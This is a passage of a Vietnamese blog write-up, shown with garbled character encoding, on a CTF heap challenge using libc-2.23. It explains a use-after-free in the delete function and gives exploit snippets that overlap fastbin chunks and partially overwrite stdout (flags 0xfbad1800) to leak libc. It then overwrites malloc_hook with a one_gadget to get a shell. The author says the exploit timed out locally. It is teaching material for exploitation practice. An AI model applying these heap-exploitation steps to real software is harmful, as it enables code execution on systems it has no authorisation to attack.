    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/6jjUZyg.png" alt="" />
    
  </figure>

</p>
</li>
<li>
<p>H√†m Create:





  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/sYxmTqp.png" alt="" />
    
  </figure>

</p>
</li>
</ul>
<p>B√†i n√†y ch·ªâ gi·ªõi h·∫°n size c·ªßa m·ªôt chunk trong kho·∫£ng 0 ƒë·∫øn 96, v√¨ libc b√†i n√†y cho ch·ªâ l√† phi√™n b·∫£n libc-2.23 v·∫≠y n√™n s·∫Ω kh√¥ng c√≥ tcache m√† b√†i n√†y ch·ªâ g√≥i g·ªçn trong fastbin, tuy b·ªã gi·ªõi h·∫°n trong fastbin nh∆∞ng d∆∞·ªùng nh∆∞ b√†i n√†y kh√¥ng c√≥ gi·ªõi h·∫°n s·ªë l∆∞·ª£ng chunk ƒë∆∞·ª£c cho ph√©p.</p>
<ul>
<li>H√†m Delete:</li>
</ul>
<p>




  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/7g3oZ41.png" alt="" />
    
  </figure>

</p>
<p>Bug n·∫±m ·ªü trong h√†m delete n√†y, b·∫•t c·ª© m·ªôt ng∆∞·ªùi ch∆°i pwn n√†o khi nh√¨n v√†o h√†m n√†y c≈©ng s·∫Ω nh·∫≠n ra ƒë∆∞·ª£c bug :lol: Bug ·ªü ƒë√¢y ƒë√≥ l√† h√†m n√†y kh√¥ng set pointer v·ªÅ null d·∫´n ƒë·∫øn l·ªói use-after-free ho·∫∑c l√† double free, c√≥ r·∫•t l√† nhi·ªÅu c√°ch ƒë·ªÉ t·∫≠n d·ª•ng hai l·ªói n√†y.</p>
<p>·ªû b√†i n√†y ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf t·∫°o ra chunk overlapped ƒë·ªÉ h√¨nh th√†nh unsorted bin sau ƒë√≥ ghi ƒë√® fd m·ªôt chunk ƒë·ªÉ leak libc, ngo√†i ra th√¨ ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf ƒë·ªÉ h∆∞·ªõng ƒë·∫øn c·∫•u tr√∫c stdout, modify flags bit ƒë·ªÉ leak libc, v√¨ b√†i n√†y kh√¥ng c√≥ h√†m in ra n√™n m√¨nh s·∫Ω k·∫øt h·ª£p c·∫£ hai c√°ch tr√™n ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë∆∞·ª£c flag.</p>
<p>M√¨nh kh√¥ng bi·∫øt b√†i n√†y r·ªët cu·ªôc b·ªã c√°i g√¨, nh∆∞ng m√† l√†m ·ªü local d√πng env <code>libc-2.23.so</code> th√¨ b·ªã l·ªói timeout, c√≤n n·∫øu d√πng env ·ªü m√°y m√¨nh th√¨ kh√¥ng t·∫≠n d·ª•ng bug ·ªü tr√™n ƒë∆∞·ª£c ,m√¨nh ng·ªìi loay hoay s·ª≠a g·∫ßn c·∫£ ti·∫øng v·∫´n kh√¥ng fix ƒë∆∞·ª£c :sadge_pepe:. V·∫≠y n√™n m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ √Ω t∆∞·ªüng exploit v√† m√¨nh ƒë·ªÉ script exploit ·ªü b√™n d∆∞·ªõi, c√≤n n·∫øu b·∫°n mu·ªën th√¨ b·∫°n h√£y debug ƒë·ªÉ h√¨nh dung technique tr√™n ho·∫°t ƒë·ªông ra sao, I&rsquo;m so sorry :(</p>


<h3 class="relative group">H∆∞·ªõng exploit 
    <div id="h%C6%B0%E1%BB%9Bng-exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#h%C6%B0%E1%BB%9Bng-exploit" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><em>ƒê·∫ßu ti√™n th√¨ fd pointer c·ªßa fastbin s·∫Ω tr·ªè ƒë·∫øn libc c·ª• th·ªÉ l√† <code>main_arena + 88</code>, nh∆∞ng b·ªüi v√¨ size ƒë∆∞·ª£c cho ph√©p ph·∫£i nh·ªè h∆°n 0x60 n√™n kh√¥ng th·ªÉ tr·ª±c ti·∫øp l·∫•y ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc th√¥ng qua fd pointer, thay v√†o ƒë√≥ ta s·∫Ω t·∫≠n d·ª•ng l·ªói uaf, th√¥ng qua bug tr√™n th√¨ ta c√≥ th·ªÉ ƒë·∫©y 1 chunk v√†o fastbin, sau ƒë√≥ ta c√≥ th·ªÉ fake m·ªôt chunk v·ªõi size t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin, sau ƒë√≥ free chunk ƒë√≥ m·ªôt l·∫ßn n·ªØa, k·∫øt qu·∫£ l√† chunk m√† ch√∫ng ta fake s·∫Ω n·∫±m trong fastbin v√† unsorted_bin, ngo√†i ra fd pointer s·∫Ω tr·ªè ƒë·∫øn libc. Sau khi c√≥ ƒë∆∞·ª£c libc th√¨ ch·ªâ c·∫ßn t·∫≠n d·ª•ng l·ªói uaf ghi ƒë√® malloc_hook th√†nh one_gadget ƒë·ªÉ c√≥ ƒë∆∞·ª£c shell. √ù t∆∞·ªüng l√† nh∆∞ v·∫≠y.</em></p>
<ul>
<li>ƒê·∫ßu ti√™n th√¨ m√¨nh s·∫Ω alloc 3 chunk v·ªõi size 0x70 v√† sau ƒë√≥ free hai chunk ƒë·∫ßu ti√™n ƒë·ªÉ t·∫≠n d·ª•ng l·ªói uaf v·ªõi m·ª•c ƒë√≠ch ch·ªìng ch√©o c√°c chunk l√™n nhau cho b∆∞·ªõc ti·∫øp theo ƒë√≥ l√† modify ƒë·ªãa ch·ªâ c·∫ßn mu·ªën.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rename</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># b√¢y gi·ªù fd c·ªßa chunk 3 tr·ªè t·ªõi ƒë·ªãa ch·ªâ c·ªßa chunk1+0x10</span>
</span></span></code></pre></div><ul>
<li>B√¢y gi·ªù ta malloc chunk 4, sau ƒë√≥ rename chunk 4 ƒë·ªÉ c√≥ th·ªÉ modify size c·ªßa chunk 1 b·ªüi v√¨ ta ƒë√£ t·∫°o 1 link gi·ªØa chunk 3 v√† chunk 1(fd chunk 3 -&gt; chunk1 + 0x10) c√≥ nghƒ©a l√† khi ta modify chunk 3 th√¨ ta ƒëang modify chunk 1. Free chunk 1 ƒë·ªÉ ƒë·∫©y chunk 1 v√†o fastbin, thay ƒë·ªïi size sao cho size c·ªßa chunk 1 t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin. K·∫øt qu·∫£ ta thu l·∫°i ƒë∆∞·ª£c ƒë√≥ l√† chunk 1 ƒëang n·∫±m ·ªü fastbin v√† unsorted_bin</li>
</ul>
<p><em>(Minh h·ªça cho √Ω t∆∞·ªüng tr√™n)</em></p>
<pre tabindex="0"><code>alloc(4,0x60,p64(0)*0xb + p64(0x71))
delete(1)
rename(4,p64(0)*0xb + p64(0x91))
delete(1)
gdb.attach(r)
</code></pre><ul>
<li>B√¢y gi·ªù th√¨ ta ch·ªâ c·∫ßn modify 2 byte cu·ªëi fd pointer c·ªßa chunk 1(main_arena + 88) n·∫±m trong unsorted_bin th√†nh ƒë·ªãa ch·ªâ m√† ta mu·ªën. C√°i m√† g·∫ßn nh·∫•t v·ªõi <code>main_arena + 88</code> ch√≠nh l√† <code>_IO_2_1_stdout</code>, ch·ªâ c√≥ 4 byte cu·ªëi c·ªßa hai ƒë·ªãa ch·ªâ m√† ta n√≥i ·ªü tr√™n l√† kh√°c nhau</li>
</ul>
<p>B·ªüi v√¨ aslr tr√™n server ƒë∆∞·ª£c b·∫≠t v√¨ v·∫≠y n·∫øu ta ghi ƒë√® 0x7fxxxxx5b78 th√†nh 0x7fxxxxx6620 th√¨ kh√¥ng kh·∫£ thi v√¨ 3 bits cu·ªëi 620 s·∫Ω gi·ªØ nguy√™n, nh∆∞ng bit th·ª© 4 t·ª´ d∆∞·ªõi l√™n(&ldquo;6&rdquo;) s·∫Ω lu√¥n random</p>
<p>T√¨m ki·∫øm m·ªôt l√∫c th√¨ c√≥ 1 ƒë·ªãa ch·ªâ ph√π h·ª£p ƒë√≥ l√† 0x7fxxxxx25dd, v√¨ bit 5dd(ƒë·ªãa ch·ªâ c·ªßa fake chunk) gi·ªØ nguy√™n c√≤n bit c√≥ gi√° tr·ªã &ldquo;2&rdquo; random th√¨ ta c√≥ th·ªÉ brute-force ƒë·∫øn khi n√†o g·∫∑p ƒë∆∞·ª£c bit ƒë√≥.
Sau khi ta ƒë√£ applied ƒë·ªãa ch·ªâ fd c·ªßa 2 chunk(m·ªôt c√°i n·∫±m ·ªü fastbin v√† c√°i c√≤n l·∫°i ·ªü unsorted_bin) c√≥ size 0x70 g·∫ßn v·ªõi ƒë·ªãa ch·ªâ c·ªßa <code>_IO_2_1_stdout</code> b·∫±ng c√°ch ghi ƒë√® ƒë·ªãa ch·ªâ c·ªßa <code>main_arena+88</code> th√†nh 0x7fxxxx25dd th√¨ ta s·∫Ω fill bi·∫øn flags c·ªßa <code>_IO_stdout</code> th√†nh 0xfbad1800 v√† 2 s·ªë cu·ªëi c·ªßa <code>_IO_write_base</code> th√†nh \x00 s·∫Ω khi·∫øn cho n√≥ nh·ªè h∆°n do ƒë√≥ ta s·∫Ω leak ƒë∆∞·ª£c nhi·ªÅu th·ª© h∆°n.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">rename</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xdd\x25</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x33</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>Sau khi ƒë√£ ghi ƒë√® th√¨ struct c·ªßa <code>_IO_2_1_stdout</code> s·∫Ω nh∆∞ n√†y</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">_IO_2_1_stdout_</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_flags</span> <span class="o">=</span> <span class="o">-</span><span class="mi">72542208</span><span class="p">,</span>  <span class="c1">//0xfbad1800
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x7ffff7dd2600</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span> <span class="sc">&#39;A&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">32</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="c1">//ghi ƒë√® 2 s·ªë cu·ªëi th√†nh \x00
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span> 
</span></span><span class="line"><span class="cl">  <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ffff7dd06e0</span> <span class="o">&lt;</span><span class="n">_IO_file_jumps</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Sau khi modified stdout th√¨ khi ch∆∞∆°ng tr√¨nh g·ªçi puts(·ªü l·∫ßn ti·∫øp theo) th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω in ra ƒë·ªãa ch·ªâ c·ªßa <code>_IO_2_1_stderr</code> v√¨ n√≥ n·∫±m ·ªü sau <code>_IO_list_all</code>
(t·ªâ l·ªá 1/16 khi brute-force ta s·∫Ω leak ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc :lol:)





  
  
  
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="Untitled.png" alt="" />
      
    </figure>
  

</p>
<p>Sau khi ƒë√£ c√≥ libc base address th√¨ ta c√≥ ƒë∆∞·ª£c ƒë·ªãa ch·ªâ g·ªëc c·ªßa malloc_hook, sau ƒë√≥ d√πng theo ph∆∞∆°ng ph√°p tr√™n, ta malloc m·ªôt chunk v·ªõi size 0x60 ƒë·ªÉ ƒë·∫©y chunk ƒë√≥ v√†o fastbin, ti·∫øp theo modify fd c·ªßa chunk ƒë√≥ v√†o fake chunk m√† ta mu·ªën, ·ªü ƒë√¢y ƒë√≥ l√† malloc_hook - 0x23. Malloc chunk ƒë√≥ l·∫°i ƒë·ªÉ c√≥ ƒë∆∞·ª£c fake chunk ta mu·ªën, sau ƒë√≥ malloc m·ªôt chunk v·ªõi size 0x60, fill b·ªüi one_gadget. Cu·ªëi c√πng malloc m·ªôt chunk m·ªõi ƒë·ªÉ trigger malloc_hook l√† c√≥ ƒë∆∞·ª£c shell.</p>

        </div>
                
        

        
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/technique_angelboy_leak/&amp;text=Technique:%20Angelboy%27s%20Leak:%20using%20IO_FILE%20to%20leak%20libc"
      title="Tweet on Twitter"
      aria-label="Tweet on Twitter"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://t.me/share/url?url=http://localhost:1313/posts/technique_angelboy_leak/&amp;resubmit=true&amp;title=Technique:%20Angelboy%27s%20Leak:%20using%20IO_FILE%20to%20leak%20libc"
      title=""
      aria-label=""
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>

  </span>


    </a>
      
    
  </section>


        


  
      </div>
     
    
     <script>
        var oid = "views_posts\/Technique_Angelboy_leak\/index.md"
        var oid_likes = "likes_posts\/Technique_Angelboy_leak\/index.md"
      </script>
      
      
      
      <script type="text/javascript" src="/js/page.min.5b1bad196a6075a1e11bae1dc95f24f67b610948a00525e347566c5a62338ea78f1c7224ab9a53873dcdb2a1a7d7d391b8a8ef45561297f68806c01315b0c4f6.js" integrity="sha512-WxutGWpgdaHhG64dyV8k9nthCUigBSXjR1ZsWmIzjqePHHIkq5pThz3NsqGn19ORuKjvRVYSl/aIBsATFbDE9g=="></script>
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/virtualbox_e1000_0day_reproduce/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Virtualbox e1000 0day Reproduce</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2022-11-28 00:00:00 &#43;0000 UTC">28 November 2022</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      ¬©Ô∏è y198 was here
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
  
  
</footer><div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
